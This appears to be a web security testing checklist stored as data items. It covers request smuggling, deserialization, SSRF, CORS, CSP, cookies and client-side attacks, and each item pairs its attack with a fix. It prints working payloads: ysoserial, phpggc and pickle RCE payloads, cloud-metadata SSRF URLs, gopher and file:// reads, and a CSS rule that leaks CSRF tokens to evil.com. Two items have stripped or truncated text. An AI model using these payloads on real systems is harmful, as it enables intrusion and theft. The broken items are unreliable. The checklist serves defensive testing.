items.how_to_fix: Reject requests with both CL and TE, use HTTP/2 end-to-end, and align front-end/back-end parsing. Add a regression test. VERIFY TE.CL payloads don't smuggle. NOTE: test carefully to avoid impacting others.
items.how_to_find:
1) Front-end uses Transfer-Encoding, back-end uses Content-Length. Send a chunked request whose chunk sizes hide a smuggled request that the back-end (reading CL) picks up.
2) Craft the chunk so the front-end forwards the whole body but the back-end sees a second request in it.
3) Confirm via a differential/poisoned next response using Burp Smuggler's TE.CL probe.
4) Smuggled request processed by back-end = TE.CL.

items.title: Test for TE.TE (obfuscated TE) smuggling
items.description: Both servers support Transfer-Encoding but one can be tricked into ignoring it via header obfuscation.
items.how_to_find:
1) Both servers support TE, so obfuscate the Transfer-Encoding header so one server ignores it and falls back to CL:
   Transfer-Encoding: xchunked , Transfer-Encoding :chunked (space), duplicate TE headers, TE: chunked\r\nTransfer-encoding: x, tab/newline tricks.
2) If one server honors TE and the other ignores it, you get a CL.TE or TE.CL desync.
3) Test each obfuscation variant with Burp Smuggler.
4) A desync from obfuscated TE = TE.TE.
items.how_to_fix: Reject any request with malformed/duplicate Transfer-Encoding headers (strict RFC parsing), use HTTP/2 end-to-end. Add a regression test. VERIFY obfuscated TE headers are rejected, not silently ignored. NOTE: test carefully.

items.title: Test for HTTP/2 downgrade smuggling
items.description: When HTTP/2 is rewritten to HTTP/1.1 at the back end, header/length ambiguities reintroduce smuggling.
items.how_to_find:
1) When the front-end speaks HTTP/2 but rewrites to HTTP/1.1 for the back-end, inject HTTP/1.1 length ambiguity via H2:
   H2.CL: set a false content-length header in the H2 request; H2.TE: inject a transfer-encoding header; also try header/CRLF injection into H2 field values.
2) The downgrade re-creates a smuggling primitive against the back-end.
3) Use Burp Smuggler in HTTP/2 mode.
4) Desync after downgrade = H2 downgrade smuggling.
items.how_to_fix: Validate/normalize H2 requests before downgrading (reject injected CL/TE and CRLF in header values), or keep HTTP/2 end-to-end. Add a regression test. VERIFY downgraded requests can't smuggle. NOTE: test carefully.

items.title: Test for request tunnelling
items.description: Even without full desync, smuggling techniques can tunnel an extra request through a single front-end connection to probe the back end.
items.how_to_find:
1) Even without a shared-connection desync, use smuggling to tunnel a second request through one front-end connection to probe the back-end directly (bypassing front-end controls/WAF).
2) Append a tunnelled request in the body and read the back-end's extra response (often visible via response length/timing).
3) Useful to reach back-end-only headers/endpoints; confirm with Burp Smuggler tunnelling probes.
4) A back-end response to a tunnelled request = finding.
items.how_to_fix: Disable back-end connection reuse for un-normalized requests, enforce strict length parsing, and use HTTP/2 end-to-end. Add a regression test. VERIFY tunnelled requests don't reach the back-end. NOTE: test carefully.

items.title: Test for response queue poisoning
items.description: A complete smuggled request can desync the response queue so users receive each other's responses, leaking sensitive data.
items.how_to_find:
1) Smuggle a COMPLETE extra request so the back-end sends an extra response, desyncing the response queue on a shared front-end connection.
2) After this, subsequent users on that connection receive the wrong (someone else's) response - capture another user's authenticated response/data.
3) Confirm by issuing follow-up requests and observing mismatched responses.
4) Receiving another user's response = response queue poisoning (high impact). CAUTION: this affects real users - only on authorized targets.
items.how_to_fix: Eliminate the desync (strict length parsing, reject ambiguous requests, HTTP/2 end-to-end) and disable back-end connection reuse. Add a regression test. VERIFY responses can't be desynced across users.

items.title: Detect serialized data and deserialization sinks
items.description: Recognizing serialized formats in cookies, params, and tokens is the first step to finding deserialization flaws.
items.how_to_find:
1) Inspect cookies, hidden fields, params, and tokens for serialized data by signature:
   Java: rO0AB (base64) or hex ac ed 00 05; PHP: O:8:"..." or a:2:{...}; Python pickle: base64 starting gAS/gAJ; .NET ViewState/BinaryFormatter; Ruby Marshal \x04\x08.
2) Decode base64/hex to confirm the format.
3) Note where the app deserializes it (the sink).
4) Recognizable serialized blobs reaching a deserializer = investigate further.
items.how_to_fix: Avoid deserializing untrusted data; prefer plain data formats (JSON) with schema validation, and sign/encrypt any serialized state you must send to clients. Add a regression test. VERIFY tampered serialized blobs are rejected.

items.title: Test Java deserialization (ysoserial gadgets)
items.description: Java native deserialization with vulnerable libraries on the classpath enables RCE via gadget chains.
items.how_to_find:
1) Find a Java serialized object (rO0AB.../ac ed 00 05) accepted by the app.
2) Generate a gadget payload with ysoserial for a likely library (CommonsCollections, Spring, etc.):
   java -jar ysoserial.jar CommonsCollections6 'nslookup BURP-COLLAB' | base64 , then submit it.
3) Use a DNS/HTTP OOB command first to confirm RCE safely; watch Collaborator.
4) An OOB callback / command execution = Java deserialization RCE.
items.how_to_fix: Don't deserialize untrusted Java objects; use JSON with a safe mapper, or if unavoidable use a strict allow-list ObjectInputFilter (JEP 290) and remove gadget libraries. Add a regression test. VERIFY gadget payloads don't execute.

items.title: Test PHP object injection (POP chains)
items.description: unserialize() on attacker data can trigger magic methods and POP chains leading to file ops or RCE.
items.how_to_find:
1) Find a PHP serialized string (O:8:"User":...) passed to unserialize().
2) Review app/framework classes for magic methods (__wakeup, __destruct, __toString) that do useful things, and craft a POP chain object that reaches a file/exec sink.
3) Tools like PHPGGC generate chains for common frameworks (Laravel, Symfony, Monolog):
   phpggc Monolog/RCE1 system id .
4) File write / command execution / OOB callback = PHP object injection.
items.how_to_fix: Never unserialize() untrusted input; use json_decode for data, and if PHP serialization is required, sign it (HMAC) and pass allowed_classes=false. Add a regression test. VERIFY crafted objects can't trigger magic-method chains.

items.title: Test .NET deserialization
items.description: BinaryFormatter, ViewState, and other .NET serializers with gadget chains enable RCE.
items.how_to_fix: Stop using BinaryFormatter/NetDataContractSerializer/unprotected ViewState; use JSON with known types, enable ViewState MAC/encryption, and apply a SerializationBinder allow-list. Add a regression test. VERIFY gadget payloads don't execute.
items.how_to_find:
1) Look for .NET serialized data: __VIEWSTATE (esp. without MAC), BinaryFormatter/LosFormatter/NetDataContractSerializer inputs, or JSON with TypeNameHandling.
2) Generate a gadget with ysoserial.net (e.g. TypeConfuseDelegate / ActivitySurrogateSelector or a ViewState gadget with the machineKey):
   ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'nslookup BURP-COLLAB' .
3) Submit and watch Collaborator for the OOB callback.
4) Command execution / callback = .NET deserialization RCE.

items.title: Test Python pickle deserialization
items.description: pickle.loads on untrusted data executes arbitrary code via __reduce__, a direct RCE primitive.
items.how_to_fix: Never pickle.loads untrusted data; use JSON, and if you must accept serialized state, sign it (HMAC) and restrict/verify before loading. Add a regression test. VERIFY malicious pickles don't execute code.
items.how_to_find:
1) Find base64 pickle data (starts gAS.../gAJ...) that the server loads with pickle.loads.
2) Build a payload whose __reduce__ runs a safe OOB command:
   class E: def __reduce__(self): return (os.system,('nslookup BURP-COLLAB',))  then pickle.dumps(E()) and base64 it.
3) Submit and watch Collaborator (use OOB, not a destructive command).
4) A callback = pickle deserialization RCE (direct primitive).

items.title: Test Ruby deserialization
items.description: Marshal.load and unsafe YAML.load on attacker data can trigger universal gadget chains for RCE.
items.how_to_fix: Don't Marshal.load or YAML.load (use YAML.safe_load / JSON) on untrusted data; sign any serialized state. Add a regression test. VERIFY universal gadget payloads don't execute.
items.how_to_find:
1) Find Ruby Marshal data (\x04\x08...) or YAML passed to Marshal.load / YAML.load (unsafe).
2) Use a known universal gadget chain for the Ruby/Rails version to build a payload that runs a safe OOB command (nslookup BURP-COLLAB).
3) Submit and watch Collaborator.
4) An OOB callback = Ruby deserialization RCE.

items.title: Test for basic (in-band) SSRF
items.description: A server-side fetch of a user-supplied URL can reach internal services.
items.how_to_find:
1) Find params/features that take a URL (webhooks, image/PDF fetch, link preview, import-from-URL, avatar-by-URL, XML/PDF renderers).
2) Point it at internal targets and see the response:
   http://127.0.0.1/  , http://localhost:80  , http://169.254.169.254/  , internal hostnames.
3) If the server fetches and reflects internal content (different from an external URL), it's in-band SSRF.
4) Note reachable internal hosts/ports.
items.how_to_fix: Allow-list permitted destinations/schemes, resolve+validate the host (block private/link-local/loopback ranges), disable redirects, and isolate egress. Add a regression test. VERIFY internal URLs are refused.

items.title: Test for blind / out-of-band SSRF
items.description: When no response is reflected, OOB interaction proves the server made the request.
items.how_to_fix: Allow-list destinations, validate resolved IPs (block private ranges), disable redirects, and restrict server egress. Add a regression test. VERIFY the server makes no request to attacker-controlled hosts.
items.how_to_find:
1) When the response isn't reflected, set the URL to a Burp Collaborator address and submit.
2) A DNS/HTTP callback confirms the server made the request (blind SSRF), even with no visible output.
3) Test various params/headers (e.g. URL fields, X-Forwarded-For-driven fetches).
4) Any OOB interaction = blind SSRF; then try internal targets via the same param.

items.title: Test SSRF against cloud metadata services
items.description: Reaching 169.254.169.254 can leak instance credentials and lead to cloud takeover.
items.how_to_find:
1) Aim SSRF at the cloud metadata endpoint:
   AWS: http://169.254.169.254/latest/meta-data/ (IMDSv1) and /latest/meta-data/iam/security-credentials/<role>; GCP: http://metadata.google.internal/computeMetadata/v1/ (needs Metadata-Flavor: Google header); Azure: http://169.254.169.254/metadata/instance?api-version=... (needs Metadata: true).
2) If credentials/tokens are returned, you can pivot to cloud API access.
3) Leaked instance credentials = critical SSRF->cloud takeover.
items.how_to_fix: Enforce IMDSv2 (token-required) or block metadata IPs from app egress, allow-list destinations, and apply least-privilege instance roles. Add a regression test. VERIFY the metadata endpoint is unreachable via the app.

items.title: Bypass SSRF allowlist/blocklist filters
items.description: Naive URL filters are bypassable with encodings, redirects, and DNS tricks.
items.how_to_find:
1) When a filter blocks internal hosts, try bypasses:
   alternate IP encodings (http://2130706433/, http://0x7f000001/, http://127.1/, http://[::1]/), DNS rebinding, redirect via an attacker URL that 302s to 169.254.169.254, userinfo tricks (http://169.254.169.254@allowed.com is wrong order - use http://allowed.com@169.254.169.254), and enclosed-alphanumerics/unicode.
2) Also try a domain you control that resolves to 127.0.0.1.
3) Reaching an internal target despite the filter = bypass.
items.how_to_fix: Don't blocklist strings; resolve the hostname and validate the final IP against private/link-local ranges (re-check after redirects), disable redirects, and allow-list. Add a regression test. VERIFY all bypass encodings are refused.

items.title: Test alternate URL schemes / protocol smuggling
items.description: Schemes like gopher://, file://, and dict:// can read files or pivot to other protocols.
items.how_to_find:
1) Try non-http schemes the fetch library may support:
   file:///etc/passwd (local file read), dict://host:port/ (probe services), gopher://host:port/_<raw bytes> (craft arbitrary TCP payloads e.g. Redis/SMTP), ftp://, ldap://.
2) gopher:// is especially powerful - it can send crafted requests to internal Redis/Memcached/DBs for RCE/data change.
3) Any scheme reading files or talking to internal services = protocol smuggling.
items.how_to_fix: Allow-list only http/https schemes (reject file/gopher/dict/ftp/ldap), and validate destinations. Add a regression test. VERIFY non-http schemes are refused.

items.title: Use SSRF for internal port/service enumeration
items.description: Timing/error differences let SSRF map internal hosts and ports.
items.how_to_find:
1) Point the SSRF at internal IPs/ports and diff responses/timing to map the network:
   http://127.0.0.1:22 vs :80 vs :6379 - open ports often give different errors/latency/banners than closed ones.
2) Iterate common ports and internal subnets with Intruder.
3) Fingerprint services by their responses.
4) A reliable open/closed signal = internal port/service enumeration via SSRF.
items.how_to_fix: Restrict app egress to required destinations, allow-list, disable redirects, and segment internal networks. Add a regression test. VERIFY the app can't reach arbitrary internal hosts/ports.

items.title: Test for reflected/arbitrary Origin acceptance
items.description: Reflecting the Origin into ACAO with credentials lets any site read authenticated responses.
items.how_to_find:
1) Send a request with a custom Origin header (Origin: https://evil.com) to an authenticated endpoint.
2) Inspect the response: if Access-Control-Allow-Origin echoes your Origin AND Access-Control-Allow-Credentials: true, any site can read the authenticated response.
3) Confirm with a PoC page on your domain making a credentialed fetch and reading the body.
4) Reflected Origin + credentials = exploitable CORS misconfig (data theft).
items.how_to_fix: Don't reflect arbitrary Origins; match against a strict server-side allow-list and only then set ACAO to that exact origin. Never combine ACAO:* with credentials. Add a regression test. VERIFY untrusted Origins get no ACAO.

items.title: Test for null Origin trust
items.description: Trusting Origin: null is exploitable from sandboxed iframes and data: documents.
items.how_to_find:
1) Send Origin: null and check if the response returns Access-Control-Allow-Origin: null with credentials.
2) If trusted, exploit it from a sandboxed iframe (<iframe sandbox="allow-scripts" srcdoc=...>) or a data:/file: document, which send Origin: null, to read authenticated responses.
3) Build a PoC that reads the body from a null-origin context.
4) ACAO: null trusted = exploitable.
items.how_to_fix: Never allow-list the null origin; require exact trusted origins only. Add a regression test. VERIFY Origin: null gets no ACAO/credentials.

items.title: Test origin-allowlist matching for bypasses
items.description: Naive substring/regex matching of the allowlist is bypassable with crafted origins.
items.how_to_find:
1) If ACAO seems allow-listed, test weak matching with crafted Origins:
   trusted.com.evil.com (suffix), eviltrusted.com (prefix), trusted.com.evil.com, https://trusted.com.evil.com, and if it does substring 'trusted.com' -> https://nottrusted.com or https://trusted.com.attacker.com.
2) Also try a sibling subdomain you can XSS, and http:// vs https://.
3) If any attacker-controllable Origin is reflected with credentials, the match is bypassable.
4) Any accepted evil Origin = finding.
items.how_to_fix: Match Origin with exact string equality against a fixed allow-list (parse and compare full origin, not substring/regex). Add a regression test. VERIFY crafted look-alike origins are rejected.

items.title: Flag overly permissive wildcard/preflight config
items.description: Wildcards on sensitive endpoints, or trusting all methods/headers in preflight, broaden attack surface.
items.how_to_fix: Scope CORS narrowly: exact-origin allow-list, no wildcard on authenticated/sensitive endpoints, and only the specific methods/headers needed in preflight responses. Add a regression test. VERIFY sensitive endpoints don't return permissive CORS.
items.how_to_find:
1) Review responses for Access-Control-Allow-Origin: * on sensitive/authenticated endpoints, and preflight (OPTIONS) responses that reflect arbitrary Access-Control-Allow-Methods/Headers.
2) Send an OPTIONS preflight with unusual Access-Control-Request-Method/Headers and see if they're blindly echoed/allowed.
3) Wildcard on sensitive data or trust-all preflight broadens attack surface.
4) Overly permissive config = finding (report even if ACAO:* can't send credentials, since it exposes data).

items.title: Check for a present, meaningful CSP
items.description: A missing CSP removes a key XSS mitigation layer.
items.how_to_find:
1) Check response headers for Content-Security-Policy (not just Content-Security-Policy-Report-Only, which doesn't enforce).
2) If absent, the app relies solely on output encoding for XSS defense.
3) Paste the policy into Google CSP Evaluator to gauge whether it's meaningful.
4) Missing/report-only CSP on HTML responses = finding (defense-in-depth gap).
items.how_to_fix: Deploy an enforcing CSP on HTML responses with a strict nonce/hash-based script-src, object-src 'none', base-uri 'none'. Add a regression test. VERIFY the header is present and enforcing.

items.title: Flag 'unsafe-inline' / 'unsafe-eval' in script-src
items.description: 'unsafe-inline' largely defeats CSP's XSS protection.
items.how_to_find:
1) Inspect the CSP script-src (and default-src) for 'unsafe-inline' or 'unsafe-eval'.
2) 'unsafe-inline' lets injected <script>/on* handlers run - largely defeating CSP's XSS protection; 'unsafe-eval' allows eval()-based sinks.
3) Note that a nonce/hash with 'strict-dynamic' causes browsers to ignore 'unsafe-inline', so check for that.
4) unsafe-inline/eval without mitigation = finding.
items.how_to_fix: Remove 'unsafe-inline'/'unsafe-eval'; use per-response nonces or hashes for scripts and refactor inline handlers/eval. Add a regression test. VERIFY inline script is blocked by the policy.

items.title: Test for wildcard / weak source allowlists
items.description: Wildcards and broad CDN/JSONP-hosting domains allow CSP bypass.
items.how_to_find:
1) Look for * , https: , data: , or broad domains in script-src.
2) Check whitelisted hosts for CSP-bypass gadgets: JSONP endpoints (callback=alert), hosted AngularJS, or open upload/CDN paths - these let an attacker load allowed-but-attacker-controlled script.
3) data: in script-src is directly bypassable.
4) A usable bypass source = critical CSP weakness (paste into CSP Evaluator to confirm).
items.how_to_fix: Drop wildcards/data:/overly-broad hosts; use nonce/hash + 'strict-dynamic' so allow-listed hosts don't matter. Add a regression test. VERIFY known bypass gadgets can't load script.

items.title: Verify frame-ancestors / object-src / base-uri
items.description: frame-ancestors prevents framing; missing base-uri/object-src enable injection and clickjacking bypass.
items.how_to_find:
1) Check the CSP for frame-ancestors (missing -> clickjacking possible; test by framing the page), object-src (missing/broad -> plugin/flash injection), and base-uri (missing -> <base> injection can hijack relative script URLs).
2) Try framing the page and, if you have HTML injection, a <base href> to redirect relative scripts.
3) Missing frame-ancestors/object-src 'none'/base-uri = finding.
items.how_to_fix: Set frame-ancestors 'self' (or specific origins), object-src 'none', and base-uri 'none' in the CSP. Add a regression test. VERIFY framing is blocked and base/object injection is prevented.

items.title: Verify HTTP Strict Transport Security (HSTS)
items.description: Without HSTS, users are exposed to TLS-stripping on first/again connections.
items.how_to_find:
1) Check HTTPS responses for Strict-Transport-Security with a long max-age (>=31536000), ideally includeSubDomains (and preload).
2) If missing/short, users are exposed to TLS-stripping / downgrade MITM, especially on first visit.
3) Confirm HTTP->HTTPS redirects exist too.
4) Missing/weak HSTS = finding.
items.how_to_fix: Send Strict-Transport-Security: max-age=31536000; includeSubDomains (add preload if eligible) on all HTTPS responses. Add a regression test. VERIFY the header is present with a strong max-age.

items.title: Check X-Content-Type-Options: nosniff
items.description: Without nosniff, browsers may MIME-sniff responses into executable content.
items.how_to_find:
1) Check responses for X-Content-Type-Options: nosniff.
2) Without it, browsers may MIME-sniff a response (e.g. treat an uploaded/user-controlled file as HTML/JS), enabling XSS via content-type confusion.
3) Especially important on file-download/upload and user-content endpoints.
4) Missing nosniff = finding.
items.how_to_fix: Send X-Content-Type-Options: nosniff on all responses and set correct Content-Type/Content-Disposition for downloads. Add a regression test. VERIFY the header is present.

items.title: Verify Referrer-Policy
items.description: A permissive Referrer-Policy leaks URLs (and any tokens in them) to third parties.
items.how_to_find:
1) Check for a Referrer-Policy header; a permissive value (e.g. unsafe-url, or none set) leaks the full URL - including tokens/IDs in the query string - to third-party sites via the Referer header.
2) Look for sensitive data in URLs (reset tokens, session ids) that would leak.
3) Missing/permissive Referrer-Policy (esp. with tokens in URLs) = finding.
items.how_to_fix: Set Referrer-Policy: strict-origin-when-cross-origin (or no-referrer for sensitive apps), and keep secrets out of URLs. Add a regression test. VERIFY the header restricts referrer leakage.

items.title: Review Permissions-Policy
items.description: Permissions-Policy limits access to powerful features (camera, geolocation, etc.).
items.how_to_find:
1) Check for a Permissions-Policy header and review which powerful features (camera, microphone, geolocation, payment, usb) are allowed and to whom.
2) A missing/loose policy lets embedded/compromised content access these APIs.
3) Confirm sensitive features are disabled or restricted to 'self'.
4) Missing/overly-permissive Permissions-Policy = finding (defense-in-depth).
items.how_to_fix: Set a Permissions-Policy that disables unused features and restricts needed ones to 'self' (e.g. camera=(), geolocation=(self)). Add a regression test. VERIFY powerful features are restricted.

items.title: Check cross-origin isolation headers (COOP/COEP/CORP)
items.description: COOP/COEP/CORP mitigate cross-origin leaks and speculative side-channel attacks.
items.how_to_find:
1) Check responses for Cross-Origin-Opener-Policy (COOP), Cross-Origin-Embedder-Policy (COEP), and Cross-Origin-Resource-Policy (CORP).
2) Without COOP: same-origin, a cross-origin opener retains a window reference (XS-Leaks, tabnabbing); without CORP, resources can be embedded cross-origin.
3) For sites handling sensitive data or using SharedArrayBuffer, absence blocks cross-origin isolation and enables side-channel leaks.
4) Missing COOP/COEP/CORP on sensitive apps = finding.
items.how_to_fix: Set Cross-Origin-Opener-Policy: same-origin, Cross-Origin-Embedder-Policy: require-corp, and Cross-Origin-Resource-Policy: same-origin where appropriate. Add a regression test. VERIFY the isolation headers are present.

items.title: Verify HttpOnly on sensitive cookies
items.description: Without HttpOnly, session/auth cookies are readable by JavaScript (XSS theft).
items.how_to_find:
1) Inspect Set-Cookie for session/auth cookies and check for the HttpOnly flag (DevTools > Application > Cookies, or the response header).
2) Without HttpOnly, document.cookie exposes the cookie to JavaScript - any XSS can steal the session.
3) Confirm by reading document.cookie in the console.
4) Session/auth cookie missing HttpOnly = finding.
items.how_to_fix: Set HttpOnly (plus Secure and SameSite) on all session/auth cookies. Add a regression test. VERIFY the cookie is not readable via document.cookie.

items.title: Verify Secure flag
items.description: Without Secure, cookies are sent over plaintext HTTP and can be intercepted.
items.how_to_find:
1) Inspect Set-Cookie for sensitive cookies and check for the Secure flag.
2) Without Secure, the browser sends the cookie over plaintext HTTP, where a network attacker can intercept it.
3) Test by making an http:// request (or a mixed-content path) and see if the cookie is sent.
4) Sensitive cookie missing Secure = finding.
items.how_to_fix: Set the Secure flag on all sensitive cookies and enforce HTTPS+HSTS. Add a regression test. VERIFY the cookie is never sent over HTTP.

items.title: Assess SameSite attribute
items.description: SameSite=None without other CSRF defenses leaves the app open to cross-site requests.
items.how_to_find:
1) Check the SameSite attribute on session cookies (Strict/Lax/None).
2) SameSite=None (or unset on old browsers) means the cookie rides cross-site requests - if there's no CSRF token, state-changing requests are forgeable (see CSRF tests).
3) Confirm by issuing a cross-site request and checking whether the cookie is attached.
4) SameSite=None without other CSRF defenses = finding.
items.how_to_fix: Use SameSite=Lax (or Strict for high-value cookies); only use None when required and pair with CSRF tokens + Secure. Add a regression test. VERIFY cross-site requests don't authorize state changes.

items.title: Review cookie Domain/Path scope and prefixes
items.description: Overly broad Domain scoping shares cookies with untrusted subdomains; __Host-/__Secure- prefixes harden binding.
items.how_to_find:
1) Review the Domain and Path of sensitive cookies. A broad Domain (e.g. .example.com) shares the cookie with every subdomain - a vulnerable/untrusted subdomain can then read or set it (session fixation/leak).
2) Check whether __Host-/__Secure- prefixes are used to harden binding.
3) Overly broad Domain scope or missing prefixes on sensitive cookies = finding.
items.how_to_fix: Scope cookies to the exact host (omit Domain or use __Host- prefix, Path=/), avoid sharing sensitive cookies across subdomains. Add a regression test. VERIFY the cookie isn't exposed to untrusted subdomains.

items.title: Test framing protection on sensitive actions
items.description: Pages that can be framed are vulnerable to UI-redress (clickjacking) attacks.
items.how_to_find:
1) Build a test page with <iframe src="https://target/sensitive-action"></iframe> and load it.
2) If the page renders in the frame (no frame-ancestors CSP / X-Frame-Options), an attacker can overlay it and trick users into clicking (UI redress) - e.g. change-email, delete, transfer, OAuth-consent.
3) Confirm the sensitive action can be triggered through the frame.
4) Framable state-changing page = clickjacking finding.
items.how_to_fix: Set Content-Security-Policy: frame-ancestors 'self' (or 'none') on sensitive pages (plus X-Frame-Options for legacy). Add a regression test. VERIFY the page refuses to be framed cross-origin.

items.title: Verify X-Frame-Options legacy header
items.description: X-Frame-Options still protects older browsers that ignore frame-ancestors.
items.how_to_find:
1) Check responses for X-Frame-Options: DENY or SAMEORIGIN, which protects older browsers that ignore CSP frame-ancestors.
2) Note that ALLOW-FROM is deprecated/unsupported; multiple/invalid values may be ignored.
3) If only CSP frame-ancestors is set, legacy browsers remain framable.
4) Missing X-Frame-Options on sensitive pages = finding (defense-in-depth alongside frame-ancestors).
items.how_to_fix: Send X-Frame-Options: DENY or SAMEORIGIN alongside CSP frame-ancestors on sensitive pages. Add a regression test. VERIFY the header is present and correct.

items.title: Test postMessage handlers for origin validation
items.description: Handlers that skip the event.origin check accept messages from any window.
items.how_to_find:
1) In DevTools, search the JS for addEventListener('message', ...) handlers and check whether they validate event.origin (and event.source).
2) If the handler acts on messages without an origin check, host a page that opens/frames the target and postMessage()s it arbitrary data.
3) Confirm the handler processes your cross-origin message.
4) A message handler with no/weak origin check = finding (often chains to DOM XSS).
items.how_to_fix: Validate event.origin against an exact allow-list at the top of every message handler (and check event.source where relevant). Add a regression test. VERIFY messages from untrusted origins are ignored.

items.title: Trace message data into dangerous sinks
items.description: Message data flowing into innerHTML/eval/location enables DOM XSS or redirect.
items.how_to_fix: Validate the message origin, then treat message data as untrusted: use safe sinks (textContent), sanitize before any HTML sink, and never pass it to eval/location. Add a regression test. VERIFY message data can't reach dangerous sinks.
items.how_to_find:
1) In the message handler, trace event.data into dangerous sinks: innerHTML/outerHTML, document.write, eval/Function, location/location.href, or postMessage forwarding.
2) Send a crafted message with a payload targeting that sink (e.g. HTML for innerHTML, javascript:/URL for location).
3) Watch for DOM XSS or an open redirect firing.
4) message data -> dangerous sink = finding (DOM XSS / redirect via postMessage).

sections.title: Client-Side Security — DOM Clobbering & Markup Injection

items.title: Test for DOM clobbering
items.description: Injected id/name attributes can overwrite JavaScript variables and properties the page expects to control, redirecting logic to attacker values.
items.how_to_find:
1) Where the app allows HTML but strips scripts (sanitized rich content), inject elements with id/name attributes that collide with JS globals the page reads: ,
, - these become window.config / form fields accessible as properties. 2) If page code does something like if(window.config)... or reads config.url without a guard, your clobbered value takes over. 3) Confirm the JS logic is redirected to attacker-controlled values. 4) Clobbered global changing behavior = finding.
items.how_to_fix: Sanitize with a clobbering-aware library (DOMPurify with SANITIZE_DOM), avoid relying on named DOM lookups for security-relevant values, and use explicit variable declarations. Add a regression test. VERIFY injected id/name can't clobber globals.

items.title: Test for dangling-markup injection
items.description: When script is blocked but raw markup is reflected, an unterminated tag/attribute can capture page content (including CSRF tokens) and exfiltrate it to an attacker host.
items.how_to_find: 1) Where markup is reflected but
items.how_to_fix: Context-encode reflected output (encode quotes/angle brackets), keep secrets out of the HTML near injection points, and deploy CSP to limit outbound requests. Add a regression test. VERIFY unterminated markup can't capture content.

items.title: Test for CSS injection and style-based exfiltration
items.description: Attacker-controlled CSS can read attribute values (CSRF tokens, hidden inputs) via attribute selectors and conditional background requests, leaking data without JavaScript.
items.how_to_find:
1) Where you can inject CSS (style attributes/<style> in sanitized HTML, or a theme/color param), use attribute selectors that fire a background request when a secret matches:
   input[name=csrf][value^='a']{background:url(//evil.com/a)} - repeat per character to leak the token.
2) Watch your server logs for the leaked prefix growing character by character.
3) No JS is needed - this bypasses CSP that only restricts script.
4) Data leaked via CSS = finding.
items.how_to_fix: Don't allow attacker-controlled CSS (sanitize/strip style and <style>), avoid putting secrets in DOM attributes, and restrict img-src/style-src in CSP. Add a regression test. VERIFY injected CSS can't read attribute values.

items.title: Test for reverse tabnabbing
items.description: Links opened with target=_blank but without rel="noopener" let the destination page rewrite the opener via window.opener.location, enabling phishing.
items.how_to_find:
1) Find links that open in a new tab (target=_blank), especially user-controlled/external links, and check for rel="noopener" (or noreferrer).
2) Without it, the opened page can access window.opener and do window.opener.location = 'https://phish' to silently redirect your original tab.
3) Test with a controlled destination page that rewrites window.opener.location.
4) target=_blank without noopener on external links = reverse tabnabbing finding.
items.how_to_fix: Add rel="noopener noreferrer" to all target=_blank links (modern browsers imply noopener, but set it explicitly for external/user links). Add a regression test. VERIFY window.opener is null on opened pages.

items.title: Test for client-side path traversal
items.description: Untrusted input concatenated into a client-built request path can redirect API calls to unintended endpoints, chaining with CSRF or reflected sinks for self-XSS escalation.
items.how_to_find:
1) Find JS that builds an API path/URL from user input (route params, hash, query) e.g. fetch('/api/'+id+'/data').
2) Inject ../ sequences (or %2f) into that input to redirect the client-side request to a different endpoint: id=../admin -> fetch('/api/../admin/data').
3) Chain with CSRF (steer a state-changing call) or a reflected/self-XSS sink to escalate.
4) A client-built request reaching an unintended endpoint = finding.
items.how_to_fix: Validate/encode user input before using it in client-built paths (reject ../ and slashes, encodeURIComponent path segments), and rely on server-side authz. Add a regression test. VERIFY traversal in the input can't redirect the request.

items.title: Test for Cross-Site WebSocket Hijacking (CSWSH)
items.description: A handshake that relies only on cookies, with no Origin check or CSRF token, can be hijacked cross-site.
items.how_to_find:
1) Inspect the WebSocket handshake (ws://ws.) - if it authenticates only via cookies and has no Origin check or CSRF token, it may be hijackable.
2) From an attacker page, open new WebSocket('wss://target/...') - the browser attaches the victim's cookies.
3) If the connection succeeds and you can send/receive the victim's data, it's CSWSH.
4) Successful cross-origin authenticated WS connection = finding (read/act as victim).
items.how_to_fix: Require a CSRF token / non-cookie auth on the WS handshake and validate the Origin header server-side. Add a regression test. VERIFY cross-origin handshakes are rejected.

items.title: Verify Origin validation on the WS handshake
items.description: The server must validate the Origin header during the upgrade handshake.
items.how_to_find:
1) Replay the WS upgrade request in Burp with a modified/foreign Origin header (Origin: https://evil.com).
2) If the server still completes the 101 Switching Protocols handshake, it isn't validating Origin (enables CSWSH).
3) Also test a missing Origin and look-alike origins.
4) Handshake accepted with an untrusted Origin = finding.
items.how_to_fix: Validate the Origin header against an exact allow-list during the upgrade handshake and reject mismatches (in addition to CSRF tokens). Add a regression test. VERIFY foreign Origins are refused.

items.title: Test WebSocket messages for injection
items.description: WS message content reaches the same sinks as HTTP — XSS, SQLi, and more.
items.how_to_find:
1) Intercept WS traffic in Burp (WebSockets history) and edit messages - WS content reaches the same server/client sinks as HTTP.
2) Inject payloads into message fields: SQLi/NoSQLi (server DB), XSS (if a message is rendered into the DOM), command/template injection.
3) Watch for DB errors, reflected script execution, or OOB callbacks.
4) A payload triggering injection via a WS message = finding.
items.how_to_fix: Apply the same input validation/output encoding and parameterized queries to WS messages as to HTTP (server and client). Add a regression test. VERIFY injection payloads in WS messages are neutralized.

items.title: Verify sensitive responses are not cached
items.description: Authenticated/sensitive responses cached by browsers or proxies leak on shared machines.
items.how_to_find:
1) Load authenticated/sensitive pages and check response headers for Cache-Control: no-store (and no Pragma/Expires that permit caching).
2) Without no-store, the browser/proxy may cache the page - on a shared machine, hitting Back or browsing the disk cache reveals another user's data.
3) Test by viewing chrome://cache or pressing Back after logout.
4) Sensitive response cached = finding.
items.how_to_fix: Send Cache-Control: no-store, no-cache (and appropriate Pragma/Expires) on authenticated/sensitive responses. Add a regression test. VERIFY sensitive pages aren't stored in browser/proxy caches.

items.title: Verify anti-CSRF tokens on state-changing requests
items.description: Without an unpredictable per-session/request token, state-changing requests can be forged.
items.how_to_find:
1) Capture a state-changing request (POST/PUT/DELETE - change email, transfer, settings) and check whether it carries an unpredictable anti-CSRF token.
2) Remove/blank the token and replay - if it still succeeds, there's no CSRF protection.
3) Build a PoC (Burp > Generate CSRF PoC) hosted on your domain and confirm it triggers the action while logged in.
4) State-changing request works without a token = CSRF finding.
items.how_to_fix: Require a per-session/per-request synchronizer token on all state-changing routes (or double-submit), plus SameSite cookies. Add a regression test. VERIFY requests without a valid token are rejected.

items.title: Test CSRF token validation strength
items.description: Tokens that are not validated, optional, reusable, or not tied to the user enable bypass.
items.how_to_find:
1) Where a CSRF token exists, test weak validation:
